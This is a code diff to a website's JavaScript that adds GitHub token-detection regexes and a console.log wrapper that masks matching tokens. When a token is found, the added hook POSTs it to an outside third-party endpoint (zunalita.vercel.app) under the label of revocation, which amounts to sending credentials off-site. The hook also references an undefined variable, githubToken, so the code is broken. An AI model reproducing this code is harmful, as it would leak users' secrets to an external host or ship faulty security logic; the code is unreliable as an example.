@@ -93,13 +93,6 @@ window.addEventListener("load", () => {
     console.groupEnd();
 });
 
-// Website sha code display
-// This will display the current deployment SHA code in the footer
-function showsha() {
-const el = document.getElementById('deploy-info');
-if (el) el.style.display = 'block';
-}
-
 // Trust secrets protector
 // Don't let anyone view it, secure yurself
 // Regex for Github token patterns
@@ -107,23 +100,64 @@ const githubTokenPatterns = [
     /ghp_[A-Za-z0-9]{36}/g, // GitHub Personal Access Token
     /gho_[A-Za-z0-9]{36}/g, // GitHub OAuth token
     /ghu_[A-Za-z0-9]{36}/g, // GitHub User token
-    /ghs_[A-Za-z0-9]{36}/g, // GitHub app token
-    /ghr_[A-Za-z0-9]{36}/g  // GitHub refresh token
+    /ghs_[A-Za-z0-9]{36}/g, // GitHub App token
+    /ghr_[A-Za-z0-9]{36}/g  // GitHub Refresh token
 ];
 
+// Function to run whenever a secret is found
+function onSecretExposed(secret) {
+    // Try to revoke token
+    revokeToken(githubToken); 
+}
+
+// Replace/mask secrets
 function maskSecrets(str) {
     let masked = str;
     githubTokenPatterns.forEach(pattern => {
-        masked = masked.replace(pattern, "***");
+        const matches = str.match(pattern);
+        if (matches) {
+            matches.forEach(secret => onSecretExposed(secret));
+            masked = masked.replace(pattern, "***");
+        }
     });
     return masked;
 }
 
+// Wrap console.log
 const originalLog = console.log;
+const originalWarn = console.warn;
+
 console.log = (...args) => {
     const maskedArgs = args.map(arg => {
         if (typeof arg === "string") return maskSecrets(arg);
         return arg;
     });
     originalLog(...maskedArgs);
+};
+
+// Revoke token function using zunalita api
+const revokeToken = async (token) => {
+  const url = "https://zunalita.vercel.app/api/revoke";
+
+  try {
+    const response = await fetch(url, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ token: token }),
+    });
+
+    const data = await response.json();
+
+    if (!response.ok) {
+      throw new Error(data.error || "Error while revoking token");
+    }
+
+    console.log(data.message);
+    return data;
+  } catch (error) {
+    console.error("Request failed:", error);
+    throw error;
+  }
 };
